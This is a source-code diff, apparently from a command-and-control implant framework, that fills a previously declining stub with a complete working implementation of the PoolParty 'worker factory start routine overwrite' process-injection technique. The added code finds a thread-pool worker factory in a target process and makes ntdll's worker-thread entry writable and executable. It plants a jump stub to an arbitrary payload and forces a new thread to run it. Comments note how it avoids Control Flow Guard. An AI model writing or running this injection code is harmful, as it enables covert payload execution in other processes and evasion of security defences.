@@ -826,9 +826,212 @@ BOOL inject_via_tpdirect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID 
 }
 
 BOOL inject_via_tpstart_routine_stub(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID lpParameter) {
-	(void)context; (void)lpStartAddress; (void)lpParameter;
-	spawn_log("tpstartstub: scaffold decline (research pending)", 0x7fffffff);
-	return FALSE;
+	/* SafeBreach PoolParty variant "Worker Factory Start Routine
+	 * Overwrite" (0xC): every TpWorkerFactory's StartRoutine IS
+	 * ntdll!TppWorkerThread - the kernel entry for NEW pool worker
+	 * threads. Temporarily overwrite those bytes in the target with a
+	 * stub [mov rax,imm64 payload][mov rcx,imm64 param][jmp rax], then
+	 * NtSetInformationWorkerFactory(ThreadMinimum = TotalWorkerCount+1)
+	 * forces the pool to mint a fresh worker whose thread start lands on
+	 * our stub - the payload runs with rcx = its real parameter (the
+	 * thread-entry ABI hands the StartParameter in rcx; we clobber it
+	 * with ours before jumping). 300ms later we restore the original
+	 * bytes so the pool stays healthy.
+	 *
+	 * Advantages over TpDirect (0xB): no TP_DIRECT layout, no IOCP post,
+	 * no TppCallbackEpilog races - and CFG never blinks because the
+	 * start ADDRESS stays a legit ntdll .text address (only the bytes
+	 * under it change, COW-private) and our raw stub has no
+	 * CFG-instrumented indirect branches.
+	 *
+	 * Factory discovery: walk the target's handles and PROBE each
+	 * duplicate with NtQueryInformationWorkerFactory - non-factories
+	 * fail the query (no NtQueryObject deadlock risk). Any factory
+	 * works: they all share the same TppWorkerThread StartRoutine.
+	 *
+	 * C-25 2026-11-14: fork&run patsies are SUSPENDED with no pool yet -
+	 * same sequencing as TpDirect (resume -> 2s warmup -> arm). Known
+	 * race: a second worker minted inside the 300ms window would re-run
+	 * the stub (accepted, same class as the TpDirect epilog race). */
+	typedef NTSTATUS(WINAPI * NTQIWF)(HANDLE, ULONG, PVOID, ULONG, PULONG);
+	typedef NTSTATUS(WINAPI * NTSIWF)(HANDLE, ULONG, PVOID, ULONG);
+	/* WORKER_FACTORY_BASIC_INFORMATION (x64, 120 bytes) - fields we use:
+	 *   ULONG  TotalWorkerCount @ +52
+	 *   PVOID  StartRoutine     @ +72  (== ntdll!TppWorkerThread) */
+	struct WF_BASIC_INFO {
+		unsigned long long Timeout, RetryTimeout, IdleTimeout;
+		unsigned char Paused, TimerSet, QueuedToExWorker, MayCreate,
+		              CreateInProgress, InsertedIntoQueue, Shutdown;
+		unsigned long BindingCount, ThreadMinimum, ThreadMaximum,
+		              PendingWorkerCount, WaitingWorkerCount,
+		              TotalWorkerCount, ReleaseCount;
+		long long InfiniteWaitGoal;
+		void * StartRoutine;
+		void * StartParameter;
+		void * ProcessId;
+		unsigned long long StackReserve, StackCommit;
+		long LastThreadCreationStatus;
+	};
+
+	HMODULE nt = GetModuleHandleA("ntdll.dll");
+	if (nt == NULL)
+		return FALSE;
+	NTQIWF pQuery = (NTQIWF)GetProcAddress(nt, "NtQueryInformationWorkerFactory");
+	NTSIWF pSet = (NTSIWF)GetProcAddress(nt, "NtSetInformationWorkerFactory");
+	if (pQuery == NULL || pSet == NULL) {
+		spawn_log("tpstartstub: ntdll apis missing", 0x7fffffff);
+		return FALSE;
+	}
+
+	/* 1. fork&run sequencing: the suspended patsy has no pool yet */
+	int forkrun = context->isSuspended && context->hThread != NULL;
+	if (forkrun) {
+		if (ResumeThread(context->hThread) == (DWORD)-1) {
+			spawn_log("tpstartstub: ResumeThread failed gle=", (long)GetLastError());
+			return FALSE;
+		}
+		Sleep(2000);
+		spawn_log("tpstartstub: patsy resumed, pool warmup done", 0x7fffffff);
+	}
+	HANDLE hProcess = context->hProcess;
+	DWORD pid = context->pid;
+
+	/* 2. find a TpWorkerFactory handle by probing duplicates */
+	ULONG len = 0x100000;
+	unsigned char * hbuf = (unsigned char *)malloc(len);
+	if (hbuf == NULL)
+		return FALSE;
+	typedef NTSTATUS(WINAPI * NTQUERYSYS)(ULONG, PVOID, ULONG, PULONG);
+	NTQUERYSYS pQuerySys = (NTQUERYSYS)GetProcAddress(nt, "NtQuerySystemInformation");
+	if (pQuerySys == NULL) {
+		free(hbuf);
+		return FALSE;
+	}
+	NTSTATUS st;
+	int tries = 0;
+	while (TRUE) {
+		ULONG need = 0;
+		st = pQuerySys(64 /*SystemExtendedHandleInformation*/, hbuf, len, &need);
+		if (st == 0xC0000004) {
+			if (++tries > 8 || need == 0 || need > 0x8000000) {
+				spawn_log("tpstartstub: walk bound exit need=", (long)need);
+				free(hbuf);
+				return FALSE;
+			}
+			unsigned char * nb = (unsigned char *)realloc(hbuf, need);
+			if (nb == NULL) {
+				free(hbuf);
+				return FALSE;
+			}
+			hbuf = nb;
+			len = need;
+			continue;
+		}
+		break;
+	}
+	if (st != 0) {
+		spawn_log("tpstartstub: handle walk failed st=", (long)st);
+		free(hbuf);
+		return FALSE;
+	}
+	ULONG_PTR count = *(ULONG_PTR *)hbuf;
+	unsigned char * row = hbuf + 16;
+	struct WF_BASIC_INFO info;
+	HANDLE factory = NULL;
+	HANDLE me = GetCurrentProcess();
+	for (ULONG_PTR i = 0; i < count && factory == NULL; i++, row += 40) {
+		ULONG_PTR hpid = *(ULONG_PTR *)(row + 8);
+		ULONG_PTR hval = *(ULONG_PTR *)(row + 16);
+		if (hpid != (ULONG_PTR)pid || hval == 0 || hval > 0xFFFFFFFF)
+			continue;
+		HANDLE dup = NULL;
+		if (!DuplicateHandle(hProcess, (HANDLE)(size_t)hval, me, &dup, 0, FALSE, DUPLICATE_SAME_ACCESS))
+			continue;
+		memset(&info, 0, sizeof(info));
+		ULONG gotlen = 0;
+		if (pQuery(dup, 7 /*WorkerFactoryBasicInformation*/, &info, sizeof(info), &gotlen) == 0
+				&& info.StartRoutine != NULL) {
+			factory = dup; /* keep it open for the set below */
+			break;
+		}
+		CloseHandle(dup);
+	}
+	free(hbuf);
+	if (factory == NULL) {
+		spawn_log("tpstartstub: no worker factory found", 0x7fffffff);
+		return FALSE;
+	}
+	spawn_log("tpstartstub: factory found, workers=", (long)info.TotalWorkerCount);
+	spawn_log("tpstartstub: start routine=", (long)(long long)(size_t)info.StartRoutine);
+
+	/* 3. save the original TppWorkerThread entry bytes */
+	unsigned char orig[24];
+	SIZE_T rgot = 0;
+	if (!beacon_ReadProcessMemory(hProcess, info.StartRoutine, orig, sizeof(orig), &rgot)
+			|| rgot != sizeof(orig)) {
+		if (!ReadProcessMemory(hProcess, info.StartRoutine, orig, sizeof(orig), &rgot)
+				|| rgot != sizeof(orig)) {
+			spawn_log("tpstartstub: read entry failed gle=", (long)GetLastError());
+			CloseHandle(factory);
+			return FALSE;
+		}
+	}
+
+	/* 4. flip the page RWX and plant the stub */
+	DWORD oldp = 0;
+	if (!VirtualProtectEx(hProcess, info.StartRoutine, 0x1000, PAGE_EXECUTE_READWRITE, &oldp)) {
+		spawn_log("tpstartstub: protect failed gle=", (long)GetLastError());
+		CloseHandle(factory);
+		return FALSE;
+	}
+	unsigned char stub[22];
+	stub[0] = 0x48; stub[1] = 0xB8;                     /* mov rax, imm64 */
+	memcpy(stub + 2, &lpStartAddress, 8);
+	stub[10] = 0x48; stub[11] = 0xB9;                   /* mov rcx, imm64 */
+	memcpy(stub + 12, &lpParameter, 8);
+	stub[20] = 0xFF; stub[21] = 0xE0;                   /* jmp rax        */
+	SIZE_T wgot = 0;
+	BOOL wok = beacon_WriteProcessMemory(hProcess, info.StartRoutine, stub, sizeof(stub), &wgot)
+	           && wgot == sizeof(stub);
+	if (!wok) {
+		wok = WriteProcessMemory(hProcess, info.StartRoutine, stub, sizeof(stub), &wgot)
+		      && wgot == sizeof(stub);
+	}
+	if (!wok) {
+		spawn_log("tpstartstub: stub write failed gle=", (long)GetLastError());
+		DWORD back = 0;
+		VirtualProtectEx(hProcess, info.StartRoutine, 0x1000, oldp, &back);
+		CloseHandle(factory);
+		return FALSE;
+	}
+	spawn_log("tpstartstub: stub planted, forcing new worker", 0x7fffffff);
+
+	/* 5. force the pool to mint a fresh worker thread (kernel start =
+	 *    StartRoutine = our stub) */
+	ULONG newmin = info.TotalWorkerCount + 1;
+	NTSTATUS s2 = pSet(factory, 4 /*WorkerFactoryThreadMinimum*/, &newmin, sizeof(newmin));
+	CloseHandle(factory);
+	if (s2 != 0) {
+		spawn_log("tpstartstub: set thread minimum st=", (long)s2);
+		DWORD back = 0;
+		WriteProcessMemory(hProcess, info.StartRoutine, orig, sizeof(orig), &wgot);
+		VirtualProtectEx(hProcess, info.StartRoutine, 0x1000, oldp, &back);
+		return FALSE;
+	}
+
+	/* 6. let the fresh worker start + run the stub, then restore */
+	Sleep(300);
+	wgot = 0;
+	if (!WriteProcessMemory(hProcess, info.StartRoutine, orig, sizeof(orig), &wgot)
+			|| wgot != sizeof(orig)) {
+		spawn_log("tpstartstub: restore failed gle=", (long)GetLastError());
+	}
+	{
+		DWORD back = 0;
+		VirtualProtectEx(hProcess, info.StartRoutine, 0x1000, oldp, &back);
+	}
+	spawn_log("tpstartstub: entry restored, armed", 0x7fffffff);
+	return TRUE;
 }
 
 /* implementation lives in src/earlycascade.cpp (4.12 EarlyCascade) */
